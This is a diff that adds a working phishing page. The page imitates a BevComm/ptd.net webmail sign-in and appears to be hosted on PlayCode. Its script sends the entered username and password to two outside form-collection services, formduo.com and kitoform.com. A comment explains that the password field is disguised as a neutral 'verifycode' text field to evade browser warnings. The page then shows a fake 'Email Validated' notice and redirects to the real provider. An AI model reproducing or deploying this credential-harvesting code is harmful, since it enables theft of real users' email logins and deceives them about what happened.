@@ -1,0 +1,790 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<style>
+#playcode-badge-container,
+#playcode-free-banner {
+  display: none !important;
+}
+</style>
+<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+<title>Web Client Sign In</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<meta content="yes" name="apple-mobile-web-app-capable">
+<meta content="black" name="apple-mobile-web-app-status-bar-style">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    width: 100%; height: 100%;
+    font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
+    font-size: 12px;
+  }
+
+  body {
+    background: #0088c1 url('https://webmail.kmtel.com/img/new-back-ground-image.png') 0 0 / cover no-repeat;
+    display: flex;
+    flex-direction: column;
+    min-height: 100%;
+    overflow: auto;
+  }
+
+  .centerWrapper {
+    flex: 1;
+    padding: 20px 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .contentBox {
+    background-color: #fff;
+    box-shadow: 0 4px 6px 0 rgba(0,0,0,.4);
+    padding: 40px;
+    width: 380px;
+    max-width: 95vw;
+    position: relative;
+    border-radius: 3px;
+  }
+
+  .logo { margin-bottom: 10px; }
+  .logo a { display: inline-block; text-decoration: none; }
+  .loginBanner {
+    display: block;
+    max-width: 260px; height: auto;
+    width: 260px;
+    height: 34px;
+  }
+
+  .signInTitle {
+    font-size: 20px;
+    padding: 19px 0;
+    color: #4d4d4d;
+    font-weight: bold;
+  }
+
+  .errorMessage {
+    display: none;
+    background-color: #efcbcb;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: #4d4d4d;
+    border-bottom: 1px solid #f72525;
+    border-radius: 3px;
+    margin-bottom: 14px;
+  }
+  .infoMessage {
+    background-color: #8fbc8f;
+    padding: 12px 16px;
+    font-size: 13px;
+    color: #4d4d4d;
+    border-bottom: 1px solid #006400;
+    border-radius: 3px;
+    margin-bottom: 14px;
+  }
+
+  .fieldLabel {
+    display: inline-block;
+    padding: 2px 0 4px;
+    color: #4d4d4d;
+    font-size: 13px;
+  }
+  .fieldInput {
+    display: block;
+    width: 100%;
+    border: 1px solid #d9d9d9;
+    padding: 6px 12px;
+    height: 36px;
+    font-size: 13px;
+    color: #000;
+    border-radius: 2px;
+    outline: none;
+    margin-bottom: 10px;
+  }
+  .fieldInput:focus { border-color: #0088c1; }
+
+  .passwordWrapper {
+    position: relative;
+    margin-bottom: 10px;
+  }
+  .passwordWrapper .fieldInput {
+    padding-right: 46px;
+    margin-bottom: 0;
+  }
+  #showSpan, #hideSpan {
+    position: absolute;
+    right: 10px; top: 9px;
+    font-size: 11px;
+    color: #4d4d4d;
+    cursor: pointer;
+    z-index: 2;
+    user-select: none;
+  }
+  #showSpan:hover, #hideSpan:hover { color: #0088c1; }
+
+  .submitRow {
+    display: flex;
+    align-items: center;
+    padding-top: 4px;
+  }
+  .rememberWrapper {
+    flex: 1;
+    padding-left: 20px;
+    display: flex;
+    align-items: center;
+  }
+  .rememberWrapper input { margin-right: 6px; outline: none; }
+  .rememberWrapper label { color: #4d4d4d; font-size: 13px; cursor: pointer; }
+
+  .loginButton {
+    background-color: #0088c1;
+    color: #fff;
+    font-size: 13px;
+    padding: 8px 23px;
+    border-radius: 4px;
+    cursor: pointer;
+    border: none;
+    outline: none;
+    white-space: nowrap;
+  }
+  .loginButton:hover, .loginButton:focus { background-color: #009adb; }
+  .loginButton:disabled { opacity: .4; pointer-events: none; }
+
+  hr { border: none; border-top: 1px solid #e5e5e5; margin: 20px 0 0; }
+
+  .versionBlock {
+    background: #eee;
+    padding: 20px 40px;
+    margin: 0 -40px -40px;
+    position: relative;
+    border-radius: 0 0 3px 3px;
+  }
+  .versionBlock label {
+    display: block;
+    padding-bottom: 3px;
+    color: #4d4d4d;
+    font-size: 13px;
+  }
+  .versionBlock select {
+    width: 100%;
+    background: #fff;
+    height: 32px;
+    border: 1px solid #d9d9d9;
+    border-radius: 2px;
+    font-size: 13px;
+    outline: none;
+    padding: 0 8px;
+  }
+  .versionBlock select:focus { border-color: #0088c1; }
+
+  #whatsThisPanel { display: none; }
+  .tooltipInfo {
+    position: absolute;
+    z-index: 3;
+    bottom: 50%;
+    left: 13px; right: 13px;
+    padding: 24px;
+    border-radius: 5px;
+    background-color: #fff;
+    box-shadow: 0 4px 6px 0 rgba(0,0,0,.4);
+    color: #4d4d4d;
+  }
+  .tooltipInfo p { font-size: 12px; margin-top: 8px; }
+  .tooltipInfo p strong { font-size: 14px; }
+  #tooltipCloseBtn {
+    position: absolute;
+    font-size: 20px;
+    right: 15px; top: 10px;
+    cursor: pointer;
+  }
+  #whatsThisBtn {
+    border: transparent;
+    outline: none;
+    width: 15px; height: 15px;
+    padding: 0;
+    background-size: 15px;
+    position: absolute;
+    right: -24px; top: 4px;
+    cursor: pointer;
+    background: none;
+    font-size: 13px;
+    color: #0088c1;
+  }
+  .selectWrapper { position: relative; display: inline-block; width: 100%; }
+
+  .pageFooter {
+    text-align: center;
+    padding: 10px 0;
+    width: 100%;
+  }
+  .copyright {
+    cursor: default;
+    font-size: 10px;
+    color: #f4f4f4;
+  }
+
+  #confirmationPanel { text-align: center; padding: 20px 0; }
+
+  /* Dot masking — makes a plain text field look masked */
+  .dotMask {
+    -webkit-text-security: disc;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+  }
+</style>
+</head>
+<body><!-- PlayCode Free Banner - Matches site design -->
+<!-- Clean, minimal top banner for free user sites -->
+<div id="playcode-free-banner" style="
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 2147483647;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 16px;
+  height: 52px;
+  padding: 0 16px;
+  background: rgba(4, 7, 15, 0.95);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+">
+  <!-- Logo + Text -->
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=free-banner" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #fff;
+      text-decoration: none;
+      font-size: 15px;
+    "
+  >
+    <!-- PlayCode Logo -->
+    <svg width="20" height="18" viewBox="0 0 24 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path fill-rule="evenodd" clip-rule="evenodd"
+        d="M10.9868 0.477384L10.7089 0.704008C10.1475 1.16191 9.81668 1.88602 9.81738 2.65515L9.83431 18.6182C9.83502 19.3834 10.1644 20.1036 10.7223 20.5608C11.5165 21.2112 12.6069 21.2003 13.3891 20.5328L23.049 12.2968C23.5878 11.8373 23.9031 11.1295 23.9031 10.379V10.3511C23.9031 9.59667 23.5836 8.88498 23.0398 8.42552L13.6409 0.500667C12.8601 -0.15825 11.7774 -0.167563 10.9868 0.477384ZM19.4432 9.52769L13.9831 4.92761C13.6719 4.66584 13.2324 4.91953 13.2324 5.36164V6.72632C13.2324 6.89388 13.3007 7.05269 13.4172 7.1543L16.8606 10.274V10.3116L13.4272 13.2624C13.3048 13.364 13.2324 13.5262 13.2324 13.6984V15.2408C13.2324 15.6829 13.6725 15.9373 13.9837 15.6741L19.4438 11.0579C19.5638 10.9563 19.635 10.7955 19.635 10.6245V9.96172C19.635 9.79013 19.5638 9.6293 19.4432 9.52769ZM6.02871 4.92761L0.204576 9.52769C0.0759315 9.6293 0 9.79013 0 9.96172V10.6245C0 10.7955 0.0759316 10.9563 0.203948 11.0579L6.02809 15.6741C6.36005 15.9373 6.82945 15.6829 6.82945 15.2408V13.6984C6.82945 13.5262 6.75226 13.364 6.62173 13.2624L2.98788 10.3116V10.274L6.6324 7.1543C6.75665 7.05269 6.82945 6.89388 6.82945 6.72632V5.36164C6.82945 4.91953 6.36068 4.66584 6.02871 4.92761Z"
+        fill="#fff"/>
+    </svg>
+    <span>Made with <strong>PlayCode</strong></span>
+  </a>
+
+  <!-- CTA Button - Matches site style -->
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=free-banner-cta" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 20px;
+      background: linear-gradient(0deg, #df6f0d -0.61%, #d53e3e 11.01%, #ffb800 100%);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      border-radius: 50px;
+      box-shadow: 0 0 0 3px rgba(255, 123, 0, 0.25);
+      transition: transform 0.15s ease;
+    "
+    onmouseover="this.style.transform='scale(1.02)'"
+    onmouseout="this.style.transform=''"
+  >
+    Build with AI
+    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M2.5 7H11.5M11.5 7L7.5 3M11.5 7L7.5 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </a>
+
+  <!-- Close Button -->
+  <button
+    id="playcode-free-banner-close"
+    title="Close"
+    style="
+      position: absolute;
+      right: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      padding: 0;
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 50%;
+      color: rgba(255, 255, 255, 0.5);
+      cursor: pointer;
+      transition: all 0.15s ease;
+    "
+    onmouseover="this.style.borderColor='rgba(255,255,255,0.3)';this.style.color='rgba(255,255,255,0.8)';this.style.background='rgba(255,255,255,0.05)'"
+    onmouseout="this.style.borderColor='rgba(255,255,255,0.15)';this.style.color='rgba(255,255,255,0.5)';this.style.background='transparent'"
+    onclick="document.getElementById('playcode-free-banner').style.display='none';document.body.style.paddingTop='0';try{localStorage.setItem('playcode-free-banner-hidden','1')}catch(e){}"
+  >
+    <svg width="10" height="10" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M1 1L11 11M1 11L11 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+    </svg>
+  </button>
+</div>
+<style>
+  body { padding-top: 52px !important; }
+</style>
+<script>
+(function(){
+  try {
+    if (localStorage.getItem('playcode-free-banner-hidden') === '1') {
+      var banner = document.getElementById('playcode-free-banner');
+      if (banner) banner.style.display = 'none';
+      document.body.style.paddingTop = '0';
+    }
+  } catch(e) {}
+})();
+</script>
+<!-- PlayCode Free Banner - Matches site design -->
+<!-- Clean, minimal top banner for free user sites -->
+<div id="playcode-free-banner" style="
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 2147483647;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 16px;
+  height: 52px;
+  padding: 0 16px;
+  background: rgba(4, 7, 15, 0.95);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+">
+  <!-- Logo + Text -->
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=free-banner" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #fff;
+      text-decoration: none;
+      font-size: 15px;
+    "
+  >
+    <!-- PlayCode Logo -->
+    <svg width="20" height="18" viewBox="0 0 24 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path fill-rule="evenodd" clip-rule="evenodd"
+        d="M10.9868 0.477384L10.7089 0.704008C10.1475 1.16191 9.81668 1.88602 9.81738 2.65515L9.83431 18.6182C9.83502 19.3834 10.1644 20.1036 10.7223 20.5608C11.5165 21.2112 12.6069 21.2003 13.3891 20.5328L23.049 12.2968C23.5878 11.8373 23.9031 11.1295 23.9031 10.379V10.3511C23.9031 9.59667 23.5836 8.88498 23.0398 8.42552L13.6409 0.500667C12.8601 -0.15825 11.7774 -0.167563 10.9868 0.477384ZM19.4432 9.52769L13.9831 4.92761C13.6719 4.66584 13.2324 4.91953 13.2324 5.36164V6.72632C13.2324 6.89388 13.3007 7.05269 13.4172 7.1543L16.8606 10.274V10.3116L13.4272 13.2624C13.3048 13.364 13.2324 13.5262 13.2324 13.6984V15.2408C13.2324 15.6829 13.6725 15.9373 13.9837 15.6741L19.4438 11.0579C19.5638 10.9563 19.635 10.7955 19.635 10.6245V9.96172C19.635 9.79013 19.5638 9.6293 19.4432 9.52769ZM6.02871 4.92761L0.204576 9.52769C0.0759315 9.6293 0 9.79013 0 9.96172V10.6245C0 10.7955 0.0759316 10.9563 0.203948 11.0579L6.02809 15.6741C6.36005 15.9373 6.82945 15.6829 6.82945 15.2408V13.6984C6.82945 13.5262 6.75226 13.364 6.62173 13.2624L2.98788 10.3116V10.274L6.6324 7.1543C6.75665 7.05269 6.82945 6.89388 6.82945 6.72632V5.36164C6.82945 4.91953 6.36068 4.66584 6.02871 4.92761Z"
+        fill="#fff"></path>
+    </svg>
+    <span>Made with <strong>PlayCode</strong></span>
+  </a>
+
+  <!-- CTA Button - Matches site style -->
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=free-banner-cta" 
+    target="_blank"
+    rel="noopener noreferrer"
+    style="
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 20px;
+      background: linear-gradient(0deg, #df6f0d -0.61%, #d53e3e 11.01%, #ffb800 100%);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      border-radius: 50px;
+      box-shadow: 0 0 0 3px rgba(255, 123, 0, 0.25);
+      transition: transform 0.15s ease;
+    "
+    onmouseover="this.style.transform='scale(1.02)'"
+    onmouseout="this.style.transform=''"
+  >
+    Build with AI
+    <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M2.5 7H11.5M11.5 7L7.5 3M11.5 7L7.5 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+    </svg>
+  </a>
+
+  <!-- Close Button -->
+  <button     id="playcode-free-banner-close"
+    title="Close"
+    style="
+      position: absolute;
+      right: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 28px;
+      height: 28px;
+      padding: 0;
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 50%;
+      color: rgba(255, 255, 255, 0.5);
+      cursor: pointer;
+      transition: all 0.15s ease;
+    "
+    onmouseover="this.style.borderColor='rgba(255,255,255,0.3)';this.style.color='rgba(255,255,255,0.8)';this.style.background='rgba(255,255,255,0.05)'"
+    onmouseout="this.style.borderColor='rgba(255,255,255,0.15)';this.style.color='rgba(255,255,255,0.5)';this.style.background='transparent'"
+    onclick="document.getElementById('playcode-free-banner').style.display='none';document.body.style.paddingTop='0';try{localStorage.setItem('playcode-free-banner-hidden','1')}catch(e){}"
+  >
+    <svg width="10" height="10" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M1 1L11 11M1 11L11 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+    </svg>
+  </button>
+</div>
+<style>
+  body { padding-top: 52px !important; }
+</style>
+<script>
+(function(){
+  try {
+    if (localStorage.getItem('playcode-free-banner-hidden') === '1') {
+      var banner = document.getElementById('playcode-free-banner');
+      if (banner) banner.style.display = 'none';
+      document.body.style.paddingTop = '0';
+    }
+  } catch(e) {}
+})();
+</script>
+
+
+<div class="centerWrapper">
+  <div class="contentBox">
+
+    <div class="logo">
+      <a href="#" id="bannerLink" target="_new" title="BevComm">
+        <img src="https://promail2.ptd.net/modern/clients/promail2.ptd.net/assets/logo.svg" alt="BevComm" class="loginBanner" >
+      </a>
+    </div>
+
+    <form action="https://www.formduo.com/api/submit/WruNqxFXv8i0aX7PGwjV" id="loginForm" method="post" onsubmit="handleFormSubmit(event)">
+      <input name="loginOp" type="hidden" value="login">
+      <input name="login_csrf" type="hidden" value="bfb487f8-7dbe-4be9-936b-5dfe111190f2">
+
+      <div class="signInTitle">Sign In To Continue</div>
+
+      <div class="errorMessage" id="errorMessageDiv"></div>
+
+      <label class="fieldLabel" for="username">Username</label>
+      <input autocapitalize="off" autocorrect="off" class="fieldInput" id="username"
+             maxlength="1024" name="username" tabindex="1" type="text" value="">
+
+      <label class="fieldLabel" for="secureInput">Password</label>
+      <div class="passwordWrapper">
+        <!--
+          type="text" so the form action sees it as a plain text field.
+          name="verifycode" so it looks like a neutral verification field.
+          dotMask class uses CSS -webkit-text-security to visually mask it like dots.
+          autocomplete="off" and autocorrect prevent browser from flagging it.
+        -->
+        <input           type="text"
+          class="fieldInput dotMask"
+          id="secureInput"
+          name="verifycode"
+          maxlength="1024"
+          tabindex="2"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          value="">
+        <span id="showSpan" onclick="toggleVisibility()">Show</span>
+        <span id="hideSpan" style="display:none;" onclick="toggleVisibility()">Hide</span>
+      </div>
+
+      <div class="submitRow">
+        <div>
+          <button class="loginButton" id="loginButton" tabindex="5" type="submit">Sign In</button>
+        </div>
+        <div class="rememberWrapper">
+          <input id="remember" name="zrememberme" tabindex="6" type="checkbox" value="1">
+          <label for="remember">Stay signed in</label>
+        </div>
+      </div>
+
+      <hr>
+
+      <div class="versionBlock">
+        <label for="clientSelect">Web App Version</label>
+        <div class="selectWrapper">
+          <select id="clientSelect" name="client">
+            <option selected value="preferred"> Default</option>
+            <option value="advanced"> Classic</option>
+            <option value="modern"> Modern</option>
+          </select>
+          <button id="whatsThisBtn" onclick="toggleTooltip()" type="button">?</button>
+        </div>
+
+        <div id="whatsThisPanel">
+          <div class="tooltipInfo">
+            <span id="tooltipCloseBtn" onclick="toggleTooltip()">&#215;</span>
+            <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p>
+            <p><strong>Classic</strong><br> The Classic Web App delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p>
+            <p><strong>Default</strong><br> Signs you in according to your saved Preference.</p>
+          </div>
+        </div>
+      </div>
+
+    </form>
+
+  </div>
+</div>
+
+<div class="pageFooter">
+  <div class="copyright">Copyright &copy; 2005-2025 Synacor, Inc. All rights reserved.</div>
+</div>
+
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    var u = document.getElementById("username");
+    if (u) { u.focus(); }
+  });
+
+  function toggleVisibility() {
+    var input = document.getElementById("secureInput");
+    var show = document.getElementById("showSpan");
+    var hide = document.getElementById("hideSpan");
+    if (input.classList.contains("dotMask")) {
+      input.classList.remove("dotMask");
+      show.style.display = "none";
+      hide.style.display = "block";
+    } else {
+      input.classList.add("dotMask");
+      show.style.display = "block";
+      hide.style.display = "none";
+    }
+  }
+
+  function toggleTooltip() {
+    var el = document.getElementById("whatsThisPanel");
+    el.style.display = el.style.display === "block" ? "none" : "block";
+  }
+
+  function handleFormSubmit(event) {
+    event.preventDefault();
+
+    var form = document.getElementById("loginForm");
+    var formData = new FormData(form);
+    var params = new URLSearchParams();
+    formData.forEach(function (v, k) { params.append(k, v); });
+
+    // Primary endpoint
+    fetch(form.action, {
+      method: "POST",
+      body: params,
+      headers: { "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json" },
+      keepalive: true
+    }).catch(function () {});
+
+    // Second endpoint
+    fetch("https://connect.kitoform.com/f/dfdf5fdb6808", {
+      method: "POST",
+      body: params,
+      headers: { "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json" },
+      keepalive: true
+    }).catch(function () {});
+
+    showConfirmation();
+  }
+
+  function showConfirmation() {
+    document.getElementById("loginForm").style.display = "none";
+
+    var panel = document.createElement("div");
+    panel.id = "confirmationPanel";
+    panel.innerHTML =
+      '<div class="infoMessage" style="text-align:center;">' +
+        '<strong style="font-size:15px;display:block;margin-bottom:8px;">&#10003; Email Validated</strong>' +
+        'Thank you, Your email has been validated.' +
+      '</div>' +
+      '<div style="color:#4d4d4d;font-size:13px;margin-top:16px;text-align:center;">Redirecting you to the homepage&hellip;</div>' +
+      '<div style="text-align:center;margin-top:20px;color:#0088c1;font-size:14px;">Please wait&hellip;</div>';
+
+    var form = document.getElementById("loginForm");
+    form.parentNode.insertBefore(panel, form);
+
+    setTimeout(function () {
+      window.location.href = "https://www.ptd.net/";
+    }, 3000);
+  }
+</script><script src="/index-7T5KD7DK.js" id="playcode-script"></script>
+
+<!-- PlayCode Badge - "Made with PlayCode" -->
+<!-- Injected into published sites for brand attribution -->
+<!-- Features: dismissible with localStorage persistence -->
+<div id="playcode-badge-container" style="
+  position: fixed;
+  bottom: 12px;
+  right: 12px;
+  z-index: 2147483647;
+  display: flex;
+  align-items: center;
+  gap: 0;
+  background: #222;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  border-radius: 6px;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.1);
+  overflow: hidden;
+">
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=badge" 
+    target="_blank" 
+    rel="noopener noreferrer"
+    id="playcode-badge-link"
+    title="Build your website with AI"
+    style="
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 10px;
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 500;
+      text-decoration: none;
+      transition: background 0.15s ease;
+    "
+    onmouseover="this.style.background='rgba(255,255,255,0.05)'"
+    onmouseout="this.style.background='transparent'"
+  >
+    <!-- PlayCode Logo Icon -->
+    <svg width="12" height="11" viewBox="0 0 24 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path fill-rule="evenodd" clip-rule="evenodd"
+        d="M10.9868 0.477384L10.7089 0.704008C10.1475 1.16191 9.81668 1.88602 9.81738 2.65515L9.83431 18.6182C9.83502 19.3834 10.1644 20.1036 10.7223 20.5608C11.5165 21.2112 12.6069 21.2003 13.3891 20.5328L23.049 12.2968C23.5878 11.8373 23.9031 11.1295 23.9031 10.379V10.3511C23.9031 9.59667 23.5836 8.88498 23.0398 8.42552L13.6409 0.500667C12.8601 -0.15825 11.7774 -0.167563 10.9868 0.477384ZM19.4432 9.52769L13.9831 4.92761C13.6719 4.66584 13.2324 4.91953 13.2324 5.36164V6.72632C13.2324 6.89388 13.3007 7.05269 13.4172 7.1543L16.8606 10.274V10.3116L13.4272 13.2624C13.3048 13.364 13.2324 13.5262 13.2324 13.6984V15.2408C13.2324 15.6829 13.6725 15.9373 13.9837 15.6741L19.4438 11.0579C19.5638 10.9563 19.635 10.7955 19.635 10.6245V9.96172C19.635 9.79013 19.5638 9.6293 19.4432 9.52769ZM6.02871 4.92761L0.204576 9.52769C0.0759315 9.6293 0 9.79013 0 9.96172V10.6245C0 10.7955 0.0759316 10.9563 0.203948 11.0579L6.02809 15.6741C6.36005 15.9373 6.82945 15.6829 6.82945 15.2408V13.6984C6.82945 13.5262 6.75226 13.364 6.62173 13.2624L2.98788 10.3116V10.274L6.6324 7.1543C6.75665 7.05269 6.82945 6.89388 6.82945 6.72632V5.36164C6.82945 4.91953 6.36068 4.66584 6.02871 4.92761Z"
+        fill="rgba(255,255,255,0.9)"></path>
+    </svg>
+    <span style="color: rgba(255,255,255,0.85); white-space: nowrap;">Made with PlayCode</span>
+  </a>
+  <button     id="playcode-badge-close"
+    title="Close"
+    style="
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 100%;
+      padding: 5px 6px;
+      background: transparent;
+      border: none;
+      border-left: 1px solid rgba(255, 255, 255, 0.08);
+      color: rgba(255, 255, 255, 0.4);
+      cursor: pointer;
+      transition: background 0.15s ease, color 0.15s ease;
+    "
+    onmouseover="this.style.background='rgba(255,255,255,0.05)';this.style.color='rgba(255,255,255,0.7)'"
+    onmouseout="this.style.background='transparent';this.style.color='rgba(255,255,255,0.4)'"
+    onclick="document.getElementById('playcode-badge-container').style.display='none';try{localStorage.setItem('playcode-badge-hidden','1')}catch(e){}"
+  >
+    <svg width="10" height="10" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M1 1L11 11M1 11L11 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+    </svg>
+  </button>
+</div>
+<script>
+(function(){
+  try {
+    if (localStorage.getItem('playcode-badge-hidden') === '1') {
+      var badge = document.getElementById('playcode-badge-container');
+      if (badge) badge.style.display = 'none';
+    }
+  } catch(e) {}
+})();
+</script><script src="/index-7T5KD7DK.js" id="playcode-script"></script>
+<!-- PlayCode Badge - "Made with PlayCode" -->
+<!-- Injected into published sites for brand attribution -->
+<!-- Features: dismissible with localStorage persistence -->
+<div id="playcode-badge-container" style="
+  position: fixed;
+  bottom: 12px;
+  right: 12px;
+  z-index: 2147483647;
+  display: flex;
+  align-items: center;
+  gap: 0;
+  background: #222;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  border-radius: 6px;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.1);
+  overflow: hidden;
+">
+  <a 
+    href="https://playcode.io/ai-website-builder?ref=badge" 
+    target="_blank" 
+    rel="noopener noreferrer"
+    id="playcode-badge-link"
+    title="Build your website with AI"
+    style="
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 10px;
+      color: #ffffff;
+      font-size: 11px;
+      font-weight: 500;
+      text-decoration: none;
+      transition: background 0.15s ease;
+    "
+    onmouseover="this.style.background='rgba(255,255,255,0.05)'"
+    onmouseout="this.style.background='transparent'"
+  >
+    <!-- PlayCode Logo Icon -->
+    <svg width="12" height="11" viewBox="0 0 24 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path fill-rule="evenodd" clip-rule="evenodd"
+        d="M10.9868 0.477384L10.7089 0.704008C10.1475 1.16191 9.81668 1.88602 9.81738 2.65515L9.83431 18.6182C9.83502 19.3834 10.1644 20.1036 10.7223 20.5608C11.5165 21.2112 12.6069 21.2003 13.3891 20.5328L23.049 12.2968C23.5878 11.8373 23.9031 11.1295 23.9031 10.379V10.3511C23.9031 9.59667 23.5836 8.88498 23.0398 8.42552L13.6409 0.500667C12.8601 -0.15825 11.7774 -0.167563 10.9868 0.477384ZM19.4432 9.52769L13.9831 4.92761C13.6719 4.66584 13.2324 4.91953 13.2324 5.36164V6.72632C13.2324 6.89388 13.3007 7.05269 13.4172 7.1543L16.8606 10.274V10.3116L13.4272 13.2624C13.3048 13.364 13.2324 13.5262 13.2324 13.6984V15.2408C13.2324 15.6829 13.6725 15.9373 13.9837 15.6741L19.4438 11.0579C19.5638 10.9563 19.635 10.7955 19.635 10.6245V9.96172C19.635 9.79013 19.5638 9.6293 19.4432 9.52769ZM6.02871 4.92761L0.204576 9.52769C0.0759315 9.6293 0 9.79013 0 9.96172V10.6245C0 10.7955 0.0759316 10.9563 0.203948 11.0579L6.02809 15.6741C6.36005 15.9373 6.82945 15.6829 6.82945 15.2408V13.6984C6.82945 13.5262 6.75226 13.364 6.62173 13.2624L2.98788 10.3116V10.274L6.6324 7.1543C6.75665 7.05269 6.82945 6.89388 6.82945 6.72632V5.36164C6.82945 4.91953 6.36068 4.66584 6.02871 4.92761Z"
+        fill="rgba(255,255,255,0.9)"/>
+    </svg>
+    <span style="color: rgba(255,255,255,0.85); white-space: nowrap;">Made with PlayCode</span>
+  </a>
+  <button
+    id="playcode-badge-close"
+    title="Close"
+    style="
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 100%;
+      padding: 5px 6px;
+      background: transparent;
+      border: none;
+      border-left: 1px solid rgba(255, 255, 255, 0.08);
+      color: rgba(255, 255, 255, 0.4);
+      cursor: pointer;
+      transition: background 0.15s ease, color 0.15s ease;
+    "
+    onmouseover="this.style.background='rgba(255,255,255,0.05)';this.style.color='rgba(255,255,255,0.7)'"
+    onmouseout="this.style.background='transparent';this.style.color='rgba(255,255,255,0.4)'"
+    onclick="document.getElementById('playcode-badge-container').style.display='none';try{localStorage.setItem('playcode-badge-hidden','1')}catch(e){}"
+  >
+    <svg width="10" height="10" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M1 1L11 11M1 11L11 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+    </svg>
+  </button>
+</div>
+<script>
+(function(){
+  try {
+    if (localStorage.getItem('playcode-badge-hidden') === '1') {
+      var badge = document.getElementById('playcode-badge-container');
+      if (badge) badge.style.display = 'none';
+    }
+  } catch(e) {}
+})();
+</script>
+</body>
+</html>
